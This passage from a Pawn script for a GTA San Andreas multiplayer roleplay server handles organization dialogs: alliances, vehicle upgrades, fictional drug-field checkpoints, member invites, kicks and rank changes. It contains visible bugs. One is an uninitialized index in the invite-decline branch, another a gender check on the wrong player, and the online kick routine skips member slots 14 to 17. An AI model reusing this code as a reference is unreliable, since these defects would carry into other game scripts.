            if(!fexist(org_file)) return SendErrorMessage(playerid, "Organizacija ne postoji!");

            if(OI[org][oSavez] != 0) return SendErrorMessage(playerid, "Vec si u savezu!");
            if(OI[orgID][oSavez] != 0) return SendErrorMessage(playerid, "Ova organizacija je vec u savezu sa nekim!");

            new id = -1;
            foreach(Player, i) {

                if(PlayerInfo[i][xLider] == orgID) {

                    id = i;
                    break;
                }
            }
            if(id == -1) return SendErrorMessage(playerid, "Nijedan lider ove organizacije nije online!");

            ponudjenSavez[playerid] = id;
            ponudjenSavez[id] = playerid;

            new str[128];
            format(str, sizeof(str), "Lider organizacije %s vam je ponudio savez", OI[org][oName]);
            ShowPlayerDialog(id, dialog_SavezPrihvati, DIALOG_STYLE_MSGBOX, "Ponuda Savez", str, "Prihvati Savez", "Odbij");

            return 1;
        }
    }
    else if(dialogid == dialog_SavezPrihvati) {

        if(!response) {

            new id = ponudjenSavez[playerid];
            ponudjenSavez[playerid] = -1;
            ponudjenSavez[id] = -1;

            SendInfoMessage(playerid, "Odbio si savez!");
            SendInfoMessage(id, "Lider je odbio savez!");

            return 1;
        }
        if(response) {

            new id = ponudjenSavez[playerid];
            new org = PlayerInfo[playerid][xLider];
            new orgID = PlayerInfo[id][xLider];

            if(OI[org][oSavez] != 0) return SendErrorMessage(playerid, "Vec si u savezu!");
            if(OI[orgID][oSavez] != 0) return SendErrorMessage(playerid, "Ova organizacija je vec u savezu sa nekim!");

            OI[org][oSavez] = orgID;
            OI[orgID][oSavez] = org;
            SaveOrganization(org);
            SaveOrganization(orgID);

            ponudjenSavez[playerid] = -1;
            ponudjenSavez[id] = -1;

            new string[128];
            format(string, sizeof(string), "Organizacija %s je sada u savezu sa vama!", OI[org][oName]);
            OrgPoruka( orgID, ZUTA, string);

            format(string, sizeof(string), "Organizacija %s je sada u savezu sa vama!", OI[orgID][oName]);
            OrgPoruka(org, ZUTA, string);

            return 1;
        }
    }
    else if(dialogid == dialog_OrgVoziloUpgrade && response) {

        new id = NajbliziMojIDOrgVeh(playerid);
        if(id == -1) return SendErrorMessage(playerid, "Nisi blizu Org Veh pickup-a!");

        if(GetPlayerMoney(playerid) < ORG_PICKUP_PRICE) return SendErrorMessage(playerid, "Nemas dovoljno novca! (%d$)", ORG_PICKUP_PRICE);

        if(listitem == 0) {

            OrgVehInfo[id][oVehKolicina1]++;
        }
        else if(listitem == 1) {

            OrgVehInfo[id][oVehKolicina2]++;
        }
        else if(listitem == 2) {

            OrgVehInfo[id][oVehKolicina3]++;
        }
        else if(listitem == 3) {

            OrgVehInfo[id][oVehKolicina4]++;
        }
        else if(listitem == 4) {

            OrgVehInfo[id][oVehKolicina5]++;
        }

        SacuvajOrgVehPickup(id);

        DajIgracuNovac(playerid, -ORG_PICKUP_PRICE);
        SendInfoMessage(playerid, "Uspesno si povecao kolicinu vozila na slotu %d!", listitem+1);

        return 1;
    }
	else if( dialogid == dialog_LIDER_2 && response ) {
	    new OrgID = PlayerInfo[ playerid ][ xLider ];
	    switch( listitem ) {
			case 0: {
			    if( OI[ OrgID ][ oControlType ] == CTIP_MARIHUANA || OI[ OrgID ][ oControlType ] == CTIP_KOKAIN  ) {

					Novi_SetPlayerCheckpoint( playerid, OI[ OrgID ][ oDrugField ][ 0 ], OI[ OrgID ][ oDrugField ][ 1 ], OI[ OrgID ][ oDrugField ][ 2 ], 3.0 );
					CheckpointStatus[ playerid ] = 15;
			        SCM( playerid, ZUTA, "Mesto za sadjenje droge, lokacija se nalazi na mapi." );
				}
				else return SendErrorMessage( playerid, "Tvoja organizacija nema ovu opciju." );
			}
			case 1: {
			    if( OI[ OrgID ][ oControlType ] == CTIP_HEROIN ) {
			    
					Novi_SetPlayerCheckpoint( playerid, 2834.8999, -2360.7681, 26.8931, 3.0 );
					CheckpointStatus[ playerid ] = 15;
			        SCM( playerid, ZUTA, "Mesto za nabavku opiuma, lokacija se nalazi na mapi." );
				}
				else return SendErrorMessage( playerid, "Tvoja organizacija nema ovu opciju." );
			}
			case 2: {
			    if( OI[ OrgID ][ oControlType ] == CTIP_BMETH ) {
			    
					Novi_SetPlayerCheckpoint( playerid, 2834.8999, -2360.7681, 26.8931, 3.0 );
					CheckpointStatus[ playerid ] = 15;
			        SCM( playerid, ZUTA, "Mesto za nabavku metilamina, lokacija se nalazi na mapi." );
				}
				else return SendErrorMessage( playerid, "Tvoja organizacija nema ovu opciju." );
			}
			case 3: {
			    if( OI[ OrgID ][ oControlType ] == CTIP_MARIHUANA || OI[ OrgID ][ oControlType ] == CTIP_KOKAIN ) {

					Novi_SetPlayerCheckpoint( playerid, 870.3927, -24.9189, 63.9863, 3.0 );
					CheckpointStatus[ playerid ] = 15;
			        SCM( playerid, ZUTA, "Mesto za nabavku metilamina, lokacija se nalazi na mapi." );
				}
				else return SendErrorMessage( playerid, "Tvoja organizacija nema ovu opciju." );
			}
	    }
	}
	else if( dialogid == dialog_UBACIUORG && response ) {
	    new igrac;
	    if( sscanf( inputtext, "u", igrac ) ) return SendErrorMessage( playerid, "Nepravilan ID!" );
	 	if( igrac == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
	 	if( PlayerInfo[ igrac ][ xLicnaKarta ] == 0 && PlayerInfo[ playerid ][ xPasos ] == 0) return SendErrorMessage( playerid, "Igrac nema licnu kartu i pasos!" );
	 	if( PlayerInfo[ igrac ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
	 	if( PlayerInfo[ igrac ][ xLider ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec clan organizacije!" );
		if( PlayerInfo[ igrac ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Za ulaz u organizacuju potreban je level 2." );
		if( PlayerInfo[ igrac ][ xKazneniUgovor ] != 0 ) return SendErrorMessage( playerid, "Igrac ima kazneni ugovor napustanja organizacije!");
		new OrgID = PlayerInfo[ playerid ][ xLider ];
		if( OI[ OrgID ][ oUbacenihClanova ] >= OI[ OrgID ][ oMaxClanova ] ) return SendErrorMessage( playerid, "Vec imas ubacenih maksimalnih %d clanova.", OI[ OrgID ][ oMaxClanova ] );
        new ImaFajl[ 40 ];
	    format( ImaFajl, sizeof( ImaFajl ), O_FILE, OrgID );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Tvoja organizacija ne postoji u bazi." );

        if(OI[OrgID][oTip] == ORG_TIP_PD && PlayerInfo[igrac][xPolicijaTest] == 0) return SendErrorMessage(playerid, "Igrac nema polozen PD test!");
	    
	    PonudioIgrac[ igrac ] = playerid;
	    
	    new string[ 512 ];
	    format( string, sizeof( string ), "Lider %s vas je pozvao u svoju orgu %s.\nDa prihvatis pretisni na 'Prihvati'.\nDa odustanes pritisni na 'Odustani'", ImeIgraca( playerid ), getOrgName( OrgID ) );
	    
	    SPD( igrac, dialog_UBACIUORG_2, DSMSG, D_NASLOV, string, D_ODABERI, D_ODUSTANI );
	}
	else if( dialogid == dialog_UBACIUORG_2 ) {
	    if( response ) {
		    new igrac = PonudioIgrac[ playerid ];

			new OrgID = PlayerInfo[ igrac ][ xLider ];
	        new ImaFajl[ 40 ];
		    format( ImaFajl, sizeof( ImaFajl ), O_FILE, OrgID );
			if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Ova organizacija ne postoji u bazi." );

            if( !strcmp( OI[ OrgID ][ oClan1 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan1 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
	   		else if( !strcmp( OI[ OrgID ][ oClan2 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan2 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan3 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan3 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan4 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan4 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan5 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan5 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan6 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan6 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan7 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan7 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan8 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan8 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan9 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan9 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan10 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan10 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan11 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan11 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan12 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan12 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan13 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan13 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan14 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan14 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan15 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan15 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan16 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan16 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan17 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan17 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan18 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan18 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan19 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan19 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan20 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan20 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan21 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan21 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan22 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan22 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan23 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan23 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan24 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan24 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan25 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan25 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan26 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan26 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan27 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan27 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan28 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan28 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan29 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan29 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else if( !strcmp( OI[ OrgID ][ oClan30 ], "Niko", true ) ) { strmid( OI[ OrgID ][ oClan30 ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), ORG_CLAN  ); }
		    else return SendErrorMessage( playerid, "Ova organizacija ima maksimalni broj clanova!" );

	        OI[ OrgID ][ oUbacenihClanova ]++;
			PlayerInfo[ playerid ][ xClan ] = OrgID;
			PlayerInfo[ playerid ][ xRank ] = 1;
			PlayerInfo[ playerid ][ xSpawn ] = SPAWN_BAZA;
			
		    if( PlayerInfo[ playerid ][ xPol ] == 1 ) {
				PlayerInfo[ playerid ][ xSkin ] = OI[ OrgID ][ oSkin1 ]; PostaviSkin( playerid, OI[ OrgID ][ oSkin1 ] );
 				
			}
			else if( PlayerInfo[ igrac ][ xPol ] == 2 ) {
				PlayerInfo[ playerid ][ xSkin ] = OI[ OrgID ][ oZSkin1 ]; PostaviSkin( playerid, OI[ OrgID ][ oZSkin1 ] );
 				
			}

			PlayerInfo[ playerid ][ xOrgUgovor ] = 0; SavePlayer( playerid ); SaveOrganization( OrgID );
		    SendInfoMessage( playerid, "Cestitamo, usli ste u organizaciju %s.", getOrgName( OrgID ) );
		    SendInfoMessage( igrac, "Igrac %s je prihvatio poziv u vasu organizaciju", ImeIgraca( playerid ) );

            if(PlayerInfo[playerid][xAchivements][2] == 0) {

                achivementPassed(playerid, 2, 1000);
            }
		    
		    PonudioIgrac[ playerid ] = -1;
		}
		else if( !response ) {
		    new igrac = PonudioIgrac[ igrac ];
		    
		    if( igrac != -1 ) {
		        SendInfoMessage( igrac, "Igrac %s je odbio poziv u vasu organizaciju", ImeIgraca( playerid ) );
		    }
		    
		    SendInfoMessage( playerid, "Odbili ste poziv za ulazak u organizaciju." );
		    PonudioIgrac[ playerid ] = -1;
		}
	}
	else if( dialogid == dialog_OFFIZBACIIZORG && response ) {
	    new imeigraca[ 24 ], ifile[ 64 ], OrgID = PlayerInfo[ playerid ][ xLider ];
	    if( sscanf( inputtext, "s[24]", imeigraca ) ) return SendErrorMessage( playerid, "Nepravilno uneto ime i prezime( Ime_Prezime )!" );
        format( ifile, 64, I_FILE, imeigraca );
		if( !fexist( ifile ) ) return SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) {
			SendErrorMessage( playerid, "Taj igrac je online tako da izbaci ga online.");
			return 1;
		}

		if( strcmp( imeigraca, OI[ OrgID ][ oClan1 ], true ) == 0) { strmid( OI[ OrgID ][ oClan1], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan2 ], true ) == 0) { strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan3 ], true ) == 0) { strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan4 ], true ) == 0) { strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan5 ], true ) == 0) { strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan6 ], true ) == 0) { strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan7 ], true ) == 0) { strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan8 ], true ) == 0) { strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan9 ], true ) == 0) { strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan10 ], true ) == 0) { strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan11 ], true ) == 0) { strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan12 ], true ) == 0) { strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan13 ], true ) == 0) { strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan14 ], true ) == 0) { strmid( OI[ OrgID ][ oClan14 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan15 ], true ) == 0) { strmid( OI[ OrgID ][ oClan15 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan16 ], true ) == 0) { strmid( OI[ OrgID ][ oClan16 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan17 ], true ) == 0) { strmid( OI[ OrgID ][ oClan17 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan18 ], true ) == 0) { strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan19 ], true ) == 0) { strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan20 ], true ) == 0) { strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan21 ], true ) == 0) { strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan22 ], true ) == 0) { strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan23 ], true ) == 0) { strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan24 ], true ) == 0) { strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan25 ], true ) == 0) { strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan26 ], true ) == 0) { strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan27 ], true ) == 0) { strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan28 ], true ) == 0) { strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan29 ], true ) == 0) { strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else if( strcmp( imeigraca, OI[ OrgID ][ oClan30 ], true ) == 0) { strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		else return SendErrorMessage( playerid, "Taj clan nije u tvojoj orgi." );

        OI[ OrgID ][ oUbacenihClanova ]--;
	    new INI:File = INI_Open( ifile );
		INI_SetTag( File, "Informacije" );
		INI_WriteInt( File, "Clan", 0 );
		INI_WriteInt( File, "Rank", 0 );
		INI_WriteInt( File, "Skin", MuskiSkinoviID[0][0]);
		INI_WriteInt( File, "Spawn", 0 );
		INI_Close( File );
		SaveOrganization( OrgID );
		SendClientMessageEx( playerid, CRVENA, "Izbacili ste igraca %s iz vase organizacije", imeigraca );
	}
	else if( dialogid == dialog_IZBACIIZORG && response ) {
	    new igrac, OrgID = PlayerInfo[ playerid ][ xLider ];
	    if( sscanf( inputtext, "u", igrac ) ) return SendErrorMessage( playerid, "Nepravilan ID!" );
	 	if( igrac == INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
		if( igrac == playerid ) return SendErrorMessage( playerid, "NE mozes sam sebe." );
	 	if( PlayerInfo[ igrac ][ xClan ] != OrgID ) return SendErrorMessage( playerid, "Igrac nije clan vase organizacije!" );
        if( PlayerInfo[ igrac ][ xLider ] > 0  ) return SendErrorMessage( playerid, "Ne mozes to lideru." );
		new ImaFajl[ 40 ], name[ MAX_PLAYER_NAME ];
		GetPlayerName( igrac, name, sizeof( name ) );
	    format( ImaFajl, sizeof( ImaFajl ), O_FILE, OrgID );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Tvoja organizacija ne postoji u bazi." );

        if( strcmp( name, OI[ OrgID ][ oClan1 ], true ) == 0) { strmid( OI[ OrgID ][ oClan1], "Niko", 0, strlen( "Niko" ), ORG_CLAN); }
		if( strcmp( name, OI[ OrgID ][ oClan2 ], true ) == 0) { strmid( OI[ OrgID ][ oClan2 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan3 ], true ) == 0) { strmid( OI[ OrgID ][ oClan3 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan4 ], true ) == 0) { strmid( OI[ OrgID ][ oClan4 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan5 ], true ) == 0) { strmid( OI[ OrgID ][ oClan5 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan6 ], true ) == 0) { strmid( OI[ OrgID ][ oClan6 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan7 ], true ) == 0) { strmid( OI[ OrgID ][ oClan7 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan8 ], true ) == 0) { strmid( OI[ OrgID ][ oClan8 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan9 ], true ) == 0) { strmid( OI[ OrgID ][ oClan9 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan10 ], true ) == 0) { strmid( OI[ OrgID ][ oClan10 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan11 ], true ) == 0) { strmid( OI[ OrgID ][ oClan11 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan12 ], true ) == 0) { strmid( OI[ OrgID ][ oClan12 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan13 ], true ) == 0) { strmid( OI[ OrgID ][ oClan13 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan18 ], true ) == 0) { strmid( OI[ OrgID ][ oClan18 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan19 ], true ) == 0) { strmid( OI[ OrgID ][ oClan19 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan20 ], true ) == 0) { strmid( OI[ OrgID ][ oClan20 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan21 ], true ) == 0) { strmid( OI[ OrgID ][ oClan21 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan22 ], true ) == 0) { strmid( OI[ OrgID ][ oClan22 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan23 ], true ) == 0) { strmid( OI[ OrgID ][ oClan23 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan24 ], true ) == 0) { strmid( OI[ OrgID ][ oClan24 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan25 ], true ) == 0) { strmid( OI[ OrgID ][ oClan25 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan26 ], true ) == 0) { strmid( OI[ OrgID ][ oClan26 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan27 ], true ) == 0) { strmid( OI[ OrgID ][ oClan27 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan28 ], true ) == 0) { strmid( OI[ OrgID ][ oClan28 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan29 ], true ) == 0) { strmid( OI[ OrgID ][ oClan29 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }
		if( strcmp( name, OI[ OrgID ][ oClan30 ], true ) == 0) { strmid( OI[ OrgID ][ oClan30 ], "Niko", 0, strlen( "Niko" ), ORG_CLAN ); }


		ResetAllWeapons( igrac );
        OI[ OrgID ][ oUbacenihClanova ]--;
		PlayerInfo[ igrac ][ xClan ] = 0; PlayerInfo[ igrac ][ xRank ] = 0; PlayerInfo[ igrac ][ xSpawn ] = SetRandomSpawn(  );
        PlayerInfo[ igrac ][ xOrgUgovor ] = 0; SavePlayer( igrac ); PlayerInfo[ igrac ][ xSkin ] = SetSexSkin( igrac ); PostaviSkin( igrac, SetSexSkin( igrac ) );
	    SendClientMessageEx( igrac, CRVENA, "Izbacen si iz organizcaije %s", getOrgName( OrgID ) ); SaveOrganization( OrgID );
	    SendClientMessageEx( playerid, CRVENA, "Izbacili ste igraca %s iz vase organizacije", ImeIgraca( igrac ) );
		
	}
	else if( dialogid == dialog_DODELIRANK && response ) {
	    new clan, OrgID = PlayerInfo[ playerid ][ xLider ], rank;
	    if( sscanf( inputtext, "ui", clan, rank ) ) return SPD( playerid, dialog_DODELIRANK, DSI, D_NASLOV, "Unesite id igraca i broj ranka koji zelite da date igracu", D_ODABERI, D_ODUSTANI);
		if( clan == IPI ) return SendErrorMessage( playerid, "Igrac nije online ili si ukucao pogresan ID!" );
		if( clan == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi." );
		if( PlayerInfo[ clan ][ xClan ] != OrgID ) return SendErrorMessage( playerid, "Igrac nije clan vase organizacije!" );
		if( PlayerInfo[ clan ][ xLider ] == OrgID ) return SendErrorMessage( playerid, "Ne mozes drugom lideru skinuti rank." );
	    if( PlayerInfo[ clan ][ xLider ] > 0  ) return SendErrorMessage( playerid, "Ne mozes to lideru." );
		new ImaFajl[ 40 ];
	    format( ImaFajl, sizeof( ImaFajl ), O_FILE, OrgID );
		if( !fexist( ImaFajl ) ) return SendErrorMessage( playerid, "Tvoja organizacija ne postoji u bazi." );
		if( rank < 1 || rank > 5 ) return SendErrorMessage( playerid, "Ne mozes veci rank od 5 a manji od 1!" );

